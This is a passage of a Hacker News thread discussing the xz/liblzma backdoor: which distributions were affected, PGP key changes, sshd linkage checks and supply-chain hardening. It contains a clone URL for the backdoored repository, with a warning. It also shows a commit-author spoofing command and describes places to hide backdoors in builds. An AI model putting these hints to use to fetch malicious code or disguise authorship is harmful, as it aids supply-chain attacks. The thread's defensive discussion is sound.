ago](item?id=39870896)   | [parent](#39870837) | [next](#39870865) [–]  It looks like git clone <https://git.tukaani.org/xz.git> still works for now (note: you will obviously be cloning malware if you do this) - that is, however, trusting the project infrastructure that compromised maintainers could have had access to, so I'm not sure if it is unmodified. HEAD (git rev-parse HEAD) on my result of doing that is currently 0b99783d63f27606936bb79a16c52d0d70c0b56f, and it does have commits people have referenced as being part of the backdoor in it. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39874639)   | [root](#39870837) | [parent](#39870896) | [next](#39871765) [–]  Apparently there's a wayback machine for git repos and it "just coincidentally" archived this repo the day before the news broke: [https://archive.softwareheritage.org/browse/origin/visits/?o...](https://archive.softwareheritage.org/browse/origin/visits/?origin_url=https://github.com/tukaani-project/xz) | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39880605)   | [root](#39870837) | [parent](#39874639) | [next](#39871765) [–]  That was me. I'm part of ArchiveTeam and Software Heritage and I'm one of the Debian sysadmins, the latter got some advanced notice. I figured archives of xz related stuff would be important once the news broke, so I saved the xz website and the GitHub repos. I regret that I didn't think to join the upstream IRC channel and archive the rest of the tukaani.org domain, nor archive the git.tukaani.org repos. Been archiving links from these threads ever since the news broke. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39880932)   | [root](#39870837) | [parent](#39880605) | [next](#39871765) [–]  As someone who was looking for that git repo, thank you :) | | --- | --- | --- | | | |  |  | [gowthamgts12](user?id=gowthamgts12) [9 months ago](item?id=39871765)   | [root](#39870837) | [parent](#39870896) | [prev](#39874639) | [next](#39870865) [–]  > <https://git.tukaani.org/xz.git> it's throwing 403 now. | | --- | --- | --- | | | |  |  | [amszmidt](user?id=amszmidt) [9 months ago](item?id=39872483)   | [root](#39870837) | [parent](#39871765) | [next](#39870865) [–]  Works cloning though. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39870865)   | [parent](#39870837) | [prev](#39870896) | [next](#39867428) [–]  Well that's inconvenient, I was (probably, time permitting) going to propose to some of my friends that we attempt to reverse this for fun tomorrow. Anyone have a link to the git history? I guess we can use the ubuntu tarball for the evil version. | | --- | --- | --- | | | |  |  | [multimoon](user?id=multimoon) [9 months ago](item?id=39867428)   | [prev](#39870837) | [next](#39870113) [–]  It seems like based on the (very well written) analysis that this is a way to bypass ssh auth, not something that phones out which would've been even scarier. My server runs arch w/ a LTS kernel (which sounds dumb on the surface, but was by far the easiest way to do ZFS on Linux that wasn't Ubuntu) and it seems that since I don't have SSH exposed to the outside internet for good reason, and my understanding is Arch never patched shhd to begin with that I and most people who would be in similar situations to me are unaffected. Still insane that this happened to begin with, and I feel bad for the Archlinux maintainers who are now going to feel more pressure to try to catch things like this. | | --- | --- | --- | | | |  |  | [NekkoDroid](user?id=NekkoDroid) [9 months ago](item?id=39875257)   | [parent](#39867428) | [next](#39870113) [–]  Being included via libsystemd isn't the only way ssh can load liblzma, it can come as an indirect dependency of Selinux (and its PAM stack) IIUC. Which makes it even a bit more funny (?) since Arch also doesn't officially support any Selinux stuff. There might be other ways sshd might pull in lzma, but those are the 2 ways I saw commonly mentioned. On a different note, pacman/makepkg got the ability to checksum source repository checkouts in 6.1. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39870113)   | [prev](#39867428) | [next](#39870526) [–]  Interesting commit in January where the actual OpenPGP key was changed: [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/76f58f1e14e44d69f712841090d331437c187b30) | | --- | --- | --- | | | |  |  | [gertvdijk](user?id=gertvdijk) [9 months ago](item?id=39870827)   | [parent](#39870113) | [next](#39870790) [–]  They just signed each other's keys around that time, and one needs to redistribute the public keys for that; nothing suspicious about it I think. The key fingerprint 22D465F2B4C173803B20C6DE59FCF207FEA7F445 remained the same. before: ```     pub   rsa4096/0x59FCF207FEA7F445 2022-12-28 [SC] [expires: 2027-12-27]         22D465F2B4C173803B20C6DE59FCF207FEA7F445     uid                             Jia Tan <jiat0218@gmail.com>     sig        0x59FCF207FEA7F445 2022-12-28   [selfsig]     sub   rsa4096/0x63CCE556C94DDA4F 2022-12-28 [E] [expires: 2027-12-27]     sig        0x59FCF207FEA7F445 2022-12-28   [keybind]  ``` after: ```     pub   rsa4096/0x59FCF207FEA7F445 2022-12-28 [SC] [expires: 2027-12-27]         22D465F2B4C173803B20C6DE59FCF207FEA7F445     uid                             Jia Tan <jiat0218@gmail.com>     sig        0x59FCF207FEA7F445 2022-12-28   [selfsig]     sig        0x38EE757D69184620 2024-01-12   Lasse Collin <lasse.collin@tukaani.org>     sub   rsa4096/0x63CCE556C94DDA4F 2022-12-28 [E] [expires: 2027-12-27]     sig        0x59FCF207FEA7F445 2022-12-28   [keybind]  ``` Lasse's key for reference: ```     pub   rsa4096/0x38EE757D69184620 2010-10-24 [SC] [expires: 2025-02-07]         3690C240CE51B4670D30AD1C38EE757D69184620     uid                             Lasse Collin <lasse.collin@tukaani.org>     sig        0x38EE757D69184620 2024-01-08   [selfsig]     sig        0x59FCF207FEA7F445 2024-01-12   Jia Tan <jiat0218@gmail.com>     sub   rsa4096/0x5923A9D358ADF744 2010-10-24 [E] [expires: 2025-02-07]     sig        0x38EE757D69184620 2024-01-08   [keybind] ``` | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39870790)   | [parent](#39870113) | [prev](#39870827) | [next](#39870526) [–]  GitHub suspended this project | | --- | --- | --- | | | |  |  | [mrbluecoat](user?id=mrbluecoat) [9 months ago](item?id=39870526)   | [prev](#39870113) | [next](#39872043) [–]  > *I am \*not\* a security researcher, nor a reverse engineer.* Could have fooled me - impressive write-up! | | --- | --- | --- | | | |  |  | [secondary\_op](user?id=secondary_op) [9 months ago](item?id=39872043)   | [prev](#39870526) | [next](#39866881) [–]  Github making suspect repository private and hiding recent account activity is wrong move and is interfering with citizens investigation efforts. | | --- | --- | --- | | | |  |  | [frenchman99](user?id=frenchman99) [9 months ago](item?id=39872862)   | [parent](#39872043) | [next](#39873954) [–]  Going forward this will require more than a citizens investigation. Law enforcement will surely be granted access. Also, tarballs are still available in package managers if you really want to dig into the code. | | --- | --- | --- | | | |  |  | [zamalek](user?id=zamalek) [9 months ago](item?id=39873954)   | [parent](#39872043) | [prev](#39872862) | [next](#39866881) [–]  It's a crime scene. It effectively has the "police" yellow tape around it. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39866881)   | [prev](#39872043) | [next](#39867798) [–]  I think the lesson here for packagers is that binary testdata should not be present while doing the build. It is too easy to hide things in testdata. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39870031)   | [parent](#39866881) | [next](#39867798) [–]  Nice idea, but then you just hide the attack in logo.png that gets embedded in the binary. Less useful for libraries, works plenty good for web/desktop/mobile. | | --- | --- | --- | | | |  |  | [consumer451](user?id=consumer451) [9 months ago](item?id=39870266)   | [root](#39866881) | [parent](#39870031) | [next](#39867798) [–]  This entire thread is above my pay grade, but isn’t minimizing the attack surface always a good thing? | | --- | --- | --- | | | |  |  | [StressedDev](user?id=StressedDev) [9 months ago](item?id=39872176)   | [root](#39866881) | [parent](#39870266) | [next](#39870418) [–]  The problem with the parent's suggestion is you end up banning lots of useful techniques while not actually stopping hackers from installing back doors or adding security exploits. The basic problem is once an attacker can submit changes to a project, the attacker can do a lot of damage. The only real solution is to do very careful code reviews. Basically, having a malicious person get code into a project is always going to be a disaster. If they can get control of a project, it is going to be even worse. | | --- | --- | --- | | | |  |  | [consumer451](user?id=consumer451) [9 months ago](item?id=39873396)   | [root](#39866881) | [parent](#39872176) | [next](#39870418) [–]  > The only real solution is to do very careful code reviews. Are there any projects that are well resourced enough to do this consistently, including all dependencies? | | --- | --- | --- | | | |  |  | [ReflectedImage](user?id=ReflectedImage) [9 months ago](item?id=39870418)   | [root](#39866881) | [parent](#39870266) | [prev](#39872176) | [next](#39867798) [–]  It's all irrelevant. The attacker social engineered their way to being the lead maintainer for the project. | | --- | --- | --- | | | |  |  | [pushedx](user?id=pushedx) [9 months ago](item?id=39867798)   | [prev](#39866881) | [next](#39875924) [–]  Mirror of the report, since the Openwall servers appear to be down. [https://web.archive.org/web/20240329182300/https://www.openw...](https://web.archive.org/web/20240329182300/https%3A//www.openwall.com/lists/oss-security/2024/03/29/4) | | --- | --- | --- | | | |  |  | [nolist\_policy](user?id=nolist_policy) [9 months ago](item?id=39875924)   | [prev](#39867798) | [next](#39866170) [–]  Debian is considering that their infrastructure may be compromised[1]. [1] [https://fulda.social/@Ganneff/112184975950858403](https://fulda.social/%40Ganneff/112184975950858403) | | --- | --- | --- | | | |  |  | [fourfour3](user?id=fourfour3) [9 months ago](item?id=39866170)   | [prev](#39875924) | [next](#39872762) [–]  Looks like Arch Linux shipped both compromised versions - and 5.6.1-2 is out to hopefully resolve it. | | --- | --- | --- | | | |  |  | [Macha](user?id=Macha) [9 months ago](item?id=39866369)   | [parent](#39866170) | [next](#39866273) [–]  5.6.1-2 is not an attempted fix, it's just some tweaks to Arch's own build script to improve reproducibility. Arch's build script ultimately delegates to the compromised build script unfortunately, but it also appears the payload itself is specifically targeting deb/RPM based distros, so a narrow miss for Arch here. (EDIT: as others have pointed out, part of the exploit is in the artifact from libxz, which Arch is now avoiding by switching to building from a git checkout) | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866423)   | [root](#39866170) | [parent](#39866369) | [next](#39866273) [–]  Are you sure about that? The diff moves away from using the compromised tarballs to the not-compromised (by this) git source. The comment message says it's about reproducibility, but especially combined with the timing it looks to me like that was just to avoid breaking an embargo. | | --- | --- | --- | | | |  |  | [tutfbhuf](user?id=tutfbhuf) [9 months ago](item?id=39866459)   | [root](#39866170) | [parent](#39866423) | [next](#39866273) [–]  So, you suggest that Frederik Schwan had prior knowledge of the security issues but hid the real purpose of the commit under "improve reproducibility"? | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866586)   | [root](#39866170) | [parent](#39866459) | [next](#39866900) [–]  Yes. I've never had to do it myself but I believe that's common practice with embargos on security vulnerabilities. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39867091)   | [root](#39866170) | [parent](#39866586) | [next](#39867059) [–]  And, If you break the embargo too many times then you just find out with the rest of us and that's not a great way to run a distro. I believe openbsd is or was in that position around the time of the intel speculative execution bugs. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867059)   | [root](#39866170) | [parent](#39866586) | [prev](#39867091) | [next](#39866900) [–]  It can lead to amusing cases where the intentional vuln comes in "to improve x" and the quiet fix comes in "to improve x". | | --- | --- | --- | | | |  |  | [Starlevel004](user?id=Starlevel004) [9 months ago](item?id=39866900)   | [root](#39866170) | [parent](#39866459) | [prev](#39866586) | [next](#39867572) [–]  xz was masked in the Gentoo repositories earlier today with the stated reason of "Investigating serious bug". No mention of security. It's pretty likely. | | --- | --- | --- | | | |  |  | [donio](user?id=donio) [9 months ago](item?id=39867366)   | [root](#39866170) | [parent](#39866900) | [next](#39867572) [–]  5.6.1 is masked specifically. Also, [https://mastodon.social/@mgorny@treehouse.systems/1121802382...](https://mastodon.social/%40mgorny%40treehouse.systems/112180238224829909) from a Gentoo dev mentions that Gentoo doesn't use the patch that results in sshd getting linked against liblzma. As far as I know this is not an official communication channel so don't take it as such. | | --- | --- | --- | | | |  |  | [NekkoDroid](user?id=NekkoDroid) [9 months ago](item?id=39867572)   | [root](#39866170) | [parent](#39866459) | [prev](#39866900) | [next](#39866273) [–]  This is very likely the case. Arch maintainers do get early information on CVEs just like any other major distro. But with pacman/makepkg 6.1 (which recently released) git sources can also now be check summed IIRC which is a funny coincidence. | | --- | --- | --- | | | |  |  | [tutfbhuf](user?id=tutfbhuf) [9 months ago](item?id=39866273)   | [parent](#39866170) | [prev](#39866369) | [next](#39867710) [–]  I upgraded Arch Linux on my server a few hours ago. Arch Linux does not fetch one of the compromised tarballs but builds from source and sshd does not link against liblzma on Arch. ```   [root@archlinux ~]# pacman -Qi xz | head -n2     Name            : xz     Version         : 5.6.1-2     [root@archlinux ~]# pacman -Qi openssh | head -n2   Name            : openssh   Version         : 9.7p1-1   [root@archlinux ~]# ldd $(which sshd) | grep liblzma   [root@archlinux ~]#  ``` It seems that Arch Linux is not affected. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866350)   | [root](#39866170) | [parent](#39866273) | [next](#39867710) [–]  5.6.1-1 was built from what I understand to be one of the affected tarballs. This was patched in 5.6.1-2: [https://gitlab.archlinux.org/archlinux/packaging/packages/xz...](https://gitlab.archlinux.org/archlinux/packaging/packages/xz/-/commit/881385757abdc39d3cfea1c3e34ec09f637424ad) I agree on the sshd linking part. | | --- | --- | --- | | | |  |  | [tutfbhuf](user?id=tutfbhuf) [9 months ago](item?id=39866401)   | [root](#39866170) | [parent](#39866350) | [next](#39867710) [–]  Interesting, they just switched from tarballs to source 19 hours ago. It seems to me that Frederik Schwan had prior knowledge of the security issue, or it is just a rare coincidence. | | --- | --- | --- | | | |  |  | [ComputerGuru](user?id=ComputerGuru) [9 months ago](item?id=39866643)   | [root](#39866170) | [parent](#39866401) | [next](#39867710) [–]  Distributions were notified under embargo. | | --- | --- | --- | | | |  |  | [aquova](user?id=aquova) [9 months ago](item?id=39867710)   | [parent](#39866170) | [prev](#39866273) | [next](#39866383) [–]  The project has made an official post on the subject [https://archlinux.org/news/the-xz-package-has-been-backdoore...](https://archlinux.org/news/the-xz-package-has-been-backdoored/) | | --- | --- | --- | | | |  |  | [mook](user?id=mook) [9 months ago](item?id=39866383)   | [parent](#39866170) | [prev](#39867710) | [next](#39866333) [–]  The writeup indicates that the backdoor only gets applied when building for rpm or deb, so Arch probably would have been okay either way? Same with Nix, Homebrew, etc. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866333)   | [parent](#39866170) | [prev](#39866383) | [next](#39872762) [–]  On arch, `ldd $(which sshd)` doesn't list lzma or xz, so I think it's unaffected? Obviously still not great to be shipping malicious code that just happens to not trigger. | | --- | --- | --- | | | |  |  | [altairprime](user?id=altairprime) [9 months ago](item?id=39866801)   | [root](#39866170) | [parent](#39866333) | [next](#39866373) [–]  Deleted per below | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866975)   | [root](#39866170) | [parent](#39866801) | [next](#39866373) [–]  This is what the `detect\_sh.bin` attached to the email does. I can only assume that the pesron who reported the vulnerability checked that this succeeds in detecting it. Note that I'm not looking for the vulnerable symbols, I'm looking for the library that does the patching in the first place. | | --- | --- | --- | | | |  |  | [altairprime](user?id=altairprime) [9 months ago](item?id=39867286)   | [root](#39866170) | [parent](#39866975) | [next](#39866373) [–]  Deleted, thanks. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39866373)   | [root](#39866170) | [parent](#39866333) | [prev](#39866801) | [next](#39872762) [–]  My Arch setup is the same, they must not patch openssh. | | --- | --- | --- | | | |  |  | [rossant](user?id=rossant) [9 months ago](item?id=39872762)   | [prev](#39866170) | [next](#39867097) [–]  Incredible. It's like discovering your colleague for 2 years at the secret nuclear weapon facility is a spy for another country, covering his tracks until the very last minute. Feels like a Hollywood movie is coming up. Should we start doing background checks on all committers to such critical IT infrastructure? | | --- | --- | --- | | | |  |  | [arter4](user?id=arter4) [9 months ago](item?id=39874879)   | [parent](#39872762) | [next](#39872800) [–]  But how? Let's say you're one of 10 maintainers of an open source project. A new user wants to contribute. What do you do? Do you ask them to send you some form of ID? Assuming this is legal and assuming you could ensure the new user is the actual owner of an actual, non counterfeit ID, what do you do? Do you vet people based on their nationality? If so, what nationality should be blackballed? Maybe 3 maintainers are American, 5 are European and 2 are Chinese. Who gets to decide? Or do you decide based on the company they work for? Open source is, by definition, open. The PR/merge request process is generally meant to accept or refuse commits based on the content (which is why you have a diff), not on the owner. Building consensus on which commits are actually valid, even in the face of malicious actors, is a notoriously difficult problem. Byzantine fault tolerance can be achieved with a 2/3 + 1 majority, but if anyone can create new identities and have them join the system (Sybil attack) you're going to have to do things differently. | | --- | --- | --- | | | |  |  | [throwaway290](user?id=throwaway290) [9 months ago](item?id=39872800)   | [parent](#39872762) | [prev](#39874879) | [next](#39867097) [–]  Not even background check but a foreground check would already help. Like literally, who dis? any identity at all? Too often maintainers who have no time just blanket approve PRs and see if stuff breaks. | | --- | --- | --- | | | |  |  | [Luker88](user?id=Luker88) [9 months ago](item?id=39867097)   | [prev](#39872762) | [next](#39868239) [–]  @people who write github scanners for updates and security issues (dependabot and the like) Can we start including a blacklist of emails and names of contributors (with reasons/links to discussions)? I can't track them and I don't want them in my projects. Might not be very helpful as it is easy to create new identities, but I see no reason to make it easier for them. Also, I might approach differently someone with lots of contributions to known projects than a new account, so it still helps. | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39867225)   | [parent](#39867097) | [next](#39867793) [–]  It takes a minute to create a new email address. And you can change or fake an email address on a git commit trivially. You, too, can writing code as anyone you want by just doing "git commit --author='Joe Biden <icecream@whitehouse.gov>'". On the internet nobody knows you're Joe Biden. | | --- | --- | --- | | | |  |  | [nine\_k](user?id=nine_k) [9 months ago](item?id=39867793)   | [parent](#39867097) | [prev](#39867225) | [next](#39869773) [–]  You can write a rather simple GitHub action that would do that: look at a PR and reject / close it if you don't like it for some reason. AFAIK open-source projects have a free quota of actions. OTOH sticking to the same email for more than one exploit might be not as wise for a malicious agent. | | --- | --- | --- | | | |  |  | [the8472](user?id=the8472) [9 months ago](item?id=39869773)   | [parent](#39867097) | [prev](#39867793) | [next](#39868239) [–]  github already suspended the account | | --- | --- | --- | | | |  |  | [ikekkdcjkfke](user?id=ikekkdcjkfke) [9 months ago](item?id=39868239)   | [prev](#39867097) | [next](#39873221) [–]  Github should probably remove the dopamine hits of green checkmarks etc. like in serious stock broker apps | | --- | --- | --- | | | |  |  | [Nathanba](user?id=Nathanba) [9 months ago](item?id=39870129)   | [parent](#39868239) | [next](#39873221) [–]  They should also remove the emojis, there is no need to have people feel good about upvotes. I've long felt uncomfortable with emojis on Slack as well. Responding to a coding or infrastructure issue should not be a social activity, I respond because it's my job and if the issue is worth it, not because a human being should feel appreciated (either them or me). | | --- | --- | --- | | | |  |  | [dpkirchner](user?id=dpkirchner) [9 months ago](item?id=39874657)   | [root](#39868239) | [parent](#39870129) | [next](#39872819) [–]  The emojis reduce (but not eliminate) the number of "me too!"s PRs will get, which IMO is a good thing. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929686)   | [root](#39868239) | [parent](#39874657) | [next](#39872819) [–]  That only requires a vote button, not a whole range of cringe cartoon images. | | --- | --- | --- | | | |  |  | [Jonnax](user?id=Jonnax) [9 months ago](item?id=39872819)   | [root](#39868239) | [parent](#39870129) | [prev](#39874657) | [next](#39873221) [–]  Many people write code for fun and slack is a social communications platform. If you can't imagine people using these tools for other reasons than pure unemotional business value then you don't understand their market. Your suggestions would lose those platforms users and revenue. | | --- | --- | --- | | | |  |  | [8organicbits](user?id=8organicbits) [9 months ago](item?id=39873221)   | [prev](#39868239) | [next](#39866039) [–]  There's good discussion of the timeline here: [https://boehs.org/node/everything-i-know-about-the-xz-backdo...](https://boehs.org/node/everything-i-know-about-the-xz-backdoor) | | --- | --- | --- | | | |  |  | [dlachausse](user?id=dlachausse) [9 months ago](item?id=39866039)   | [prev](#39873221) | [next](#39866655) [–]  > openssh does not directly use liblzma. However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma. It looks to be limited to Linux systems that are running certain patches. macOS and BSD seem unaffected? | | --- | --- | --- | | | |  |  | [delphij](user?id=delphij) [9 months ago](item?id=39866380)   | [parent](#39866039) | [next](#39866655) [–]  FreeBSD is not affected as the payloads in question were stripped out, however we are looking into improvements to our workflow to further improve the import process. | | --- | --- | --- | | | |  |  | [notyoutube](user?id=notyoutube) [9 months ago](item?id=39866655)   | [prev](#39866039) | [next](#39866044) [–]  Is the solution against such attacks in the future only to scrutinize more, or are there other reasonable options in terms of hardening? | | --- | --- | --- | | | |  |  | [JanisErdmanis](user?id=JanisErdmanis) [9 months ago](item?id=39866910)   | [parent](#39866655) | [next](#39882192) [–]  The lesson here seems to not depend on tools written in languages that have complex, obscure build systems and no one is either able or interested to read. Using tools rewritten in Rust, Go or any other languege which resolves dependencies within project seems the only way to do hardening here. | | --- | --- | --- | | | |  |  | [blcknight](user?id=blcknight) [9 months ago](item?id=39867137)   | [root](#39866655) | [parent](#39866910) | [next](#39867870) [–]  I agree there's safer languages than C, but nobody reads the 50,000 lines changed when you update the vendoring in a random golang project. It would be easy to introduce something there that nobody notices too. | | --- | --- | --- | | | |  |  | [JanisErdmanis](user?id=JanisErdmanis) [9 months ago](item?id=39867613)   | [root](#39866655) | [parent](#39867137) | [next](#39867870) [–]  It is generally harder to introduce vulnerabilities in readable language even more when it is memory safe. Sure life is not perfect and bad actors would have found a ways to inject vulnerabilities also in Rust, Go codebase. The benefit of modern languages is that there is one way to build things and the source code is the only thing that needs to be auditted. | | --- | --- | --- | | | |  |  | [mstef](user?id=mstef) [9 months ago](item?id=39875327)   | [root](#39866655) | [parent](#39867613) | [next](#39867870) [–]  this backdoor had nothing at all to do with memory safety. | | --- | --- | --- | | | |  |  | [arp242](user?id=arp242) [9 months ago](item?id=39867870)   | [root](#39866655) | [parent](#39866910) | [prev](#39867137) | [next](#39868461) [–]  You don't need a complex obscure build system for most C code. There's a lot of historical baggage here, but many projects (including xz, I suspect) can get away with a fairly straight-forward Makefile. Double so when using some GNU make extensions. | | --- | --- | --- | | | |  |  | [buserror](user?id=buserror) [9 months ago](item?id=39872727)   | [root](#39866655) | [parent](#39867870) | [next](#39868461) [–]  Thanks for that post, I wish people stopped pushing ever so more complicated build systems, opaque, non-backward compatible between their own versions when a 2 pages Makefile would work just fine, and still work in 20 years time. | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39868461)   | [root](#39866655) | [parent](#39866910) | [prev](#39867870) | [next](#39867357) [–]  Rust is the worst in terms of build system transparency. Ever heard of build.rs? You can hide backdoors in any crate, or in any crate's build.rs, or the same recursively. | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39868713)   | [root](#39866655) | [parent](#39868461) | [next](#39867357) [–]  Most build systems are turing-complete. Rust, at least, drastically reduces the need for custom build scripts (most of my projects have empty build.rs files or lack one entirely), and build.rs being in the same language as the rest of the codebase aids transparency immensely. | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39868779)   | [root](#39866655) | [parent](#39868713) | [next](#39867357) [–]  That doesn't make build.rs any less of a juicy target for a supply chain attack. Arbitrary code downloaded from the internet and run at build time? That's a nightmare scenario for auditing, much worse than anything Autotools or CMake can offer. | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39868912)   | [root](#39866655) | [parent](#39868779) | [next](#39867357) [–]  You're not wrong about arbitrary code execution. It's just that your statement applies to most of the packages on any linux distribution, Autotools and Cmake included, regardless of language. Many moreso than Rust due to the aforementioned features of Cargo and build.rs not requiring me to be an expert in a second language just to audit it. | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39869417)   | [root](#39866655) | [parent](#39868912) | [next](#39867357) [–]  Packages in a Linux distro are not built on my machine, they are built by the distro in a sandbox. Every time I type "cargo build" I am potentially running arbitrary code downloaded from the internet. Every time I type "make" in an Autotools program only my code runs. > not requiring me to be an expert in another language just to audit it. Do you do that every time your Cargo.lock changes? | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39869601)   | [root](#39866655) | [parent](#39869417) | [next](#39869785) [–]  > Every time I type "make" in an Autotools program only my code runs. Says who? Make is just as good at calling arbitrary code as Cargo. Including code that reaches out over the network. Have you audited every single makefile to ensure that isn't the case? | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39872732)   | [root](#39866655) | [parent](#39869601) | [next](#39869785) [–]  I am talking about *my* makefiles. They don't automatically build dependencies that I have no control on. Whereas building *my* crate can run code locally that no one has ever audited. | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39876601)   | [root](#39866655) | [parent](#39872732) | [next](#39869785) [–]  So... you're complaining about what could happen in a Rust build if you include a library without examining that library first? How do you think that is different from doing the same in any other language? | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39877404)   | [root](#39866655) | [parent](#39876601) | [next](#39869785) [–]  The difference is that in another language the build step is delegated to someone else who has packaged the code, and every version has presumably gone through some kind of audit. With Rust I have no idea what new transitive dependencies could be included any time I update one of my dependencies, and what code could be triggered *just by building my program* without even running it. Again, we're not talking about the dependencies that I choose, but the whole transitive closure of dependencies, including the most low-level. Did you examine serde the first time *you used a dependency that used it*? serde did have in the past a slightly sketchy case of using a pre-built binary. Or the whole dependency tree of Bevy? I mean, Rust has many advantages but the cargo supply chain story is an absolute disaster---not that it's alone, pypi or nodejs or Ruby gems are the same. | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39878306)   | [root](#39866655) | [parent](#39877404) | [next](#39869785) [–]  > The difference is that in another language the build step is delegated to someone else who has packaged the code Fedora packages a large number of Rust libraries, just as you describe. Nothing prevents you from using the packaged libraries if you prefer them. You may find helpful information here: [https://docs.fedoraproject.org/en-US/packaging-guidelines/Ru...](https://docs.fedoraproject.org/en-US/packaging-guidelines/Rust/) | | --- | --- | --- | | | |  |  | [bonzini](user?id=bonzini) [9 months ago](item?id=39880096)   | [root](#39866655) | [parent](#39878306) | [next](#39869785) [–]  > Nothing prevents you from using the packaged libraries if you prefer them Nothing except, in no particular order: 1) only having one version of crates 2) mismatched features 3) new transitive dependencies that can be introduced at any time without any warning 4) only supporting one version of rust 5) packages being noarch and basically glorified distro-wide vendoring—so their build.rs code is still run on your machine at cargo build time | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39880778)   | [root](#39866655) | [parent](#39880096) | [next](#39869785) [–]  > 1) only having one version of crates Same as any other library provided by the distribution in any other language. > 2) mismatched features Same as any other library provided by the distribution in any other language. > 3) new transitive dependencies that can be introduced at any time without any warning Not in packaged Rust libraries in Fedora, at least. Please read the aforementioned link. > 4) only supporting one version of rust Same as any other library provided by the distribution in any other language. > 5) packages being noarch and basically glorified distro-wide vendoring Packages containing only source is a consequence of the Rust ABI still stabilizing, see: <https://github.com/rust-lang/rust/pull/105586> After ABI stabilization, Rust libraries will be first class like any other language. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39869785)   | [root](#39866655) | [parent](#39869417) | [prev](#39869601) | [next](#39867357) [–]  seems trivial for a configure script to call curl/wget somewhere in the depths of it, no? | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39869889)   | [root](#39866655) | [parent](#39869785) | [next](#39870654) [–]  Exactly. And at least Cargo will refuse to download a crate which has been yanked. So any crate which has been discovered to be compromised can be yanked, preventing further damage even when someone has already downloaded something which depends on it. Building packages with up-to-date dependencies is also vastly preferable to building against ancient copies of libraries vendored into a codebase at some point in the past, a situation I see far too often in C/C++ codebases. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39870654)   | [root](#39866655) | [parent](#39869785) | [prev](#39869889) | [next](#39867357) [–]  Debian’s rules files often deliberately sinkhole the entire network during the build. It’s not the worst idea. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39874178)   | [root](#39866655) | [parent](#39870654) | [next](#39867357) [–]  I wonder if you could do it inside the config script without the network. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39867357)   | [root](#39866655) | [parent](#39866910) | [prev](#39868461) | [next](#39867417) [–]  Wouldn't a supply chain attack like this be much worse with Rust and Cargo because of the fact it's not just a single dynamic library that needs to be reinstalled system-wise, but, instead, every binary would require a new release? | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39867687)   | [root](#39866655) | [parent](#39867357) | [next](#39867944) [–]  It would mean rebuilding more packages. I don't think that's meaningfully "much worse", package mangers are perfectly capable of rebuilding the world and the end-user fix is the same "pacman -Syu"/"apt-get update && apt-get upgrade"/... On the flip side the elegant/readable build system means that the place this exploit was hidden wouldn't exist. Though I wouldn't confidently say that 'no hiding places exist' (especially with the parts of the ecosystem that wrap dependencies in other languages). | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39867829)   | [root](#39866655) | [parent](#39867687) | [next](#39867944) [–]  It's much worse because it requires repackaging every affected system package instead of a single library. Knowing which packages are affected is difficult because that information isn't exposed to the larger system package manager. After all, it's all managed by the build system. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39867850)   | [root](#39866655) | [parent](#39867829) | [next](#39867944) [–]  In the era of modern CI and build infrastructure, I don't really think that's materially an issue. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39867942)   | [root](#39866655) | [parent](#39867850) | [next](#39867944) [–]  Those CI and build infrastructures rely on the Debian and RedHat being able to build system packages. How would an automated CI or build infrastructure stop this attack? It was stopped because the competent package maintainer noticed a performance regression. In this case, this imagined build system would have to track every rust library used in 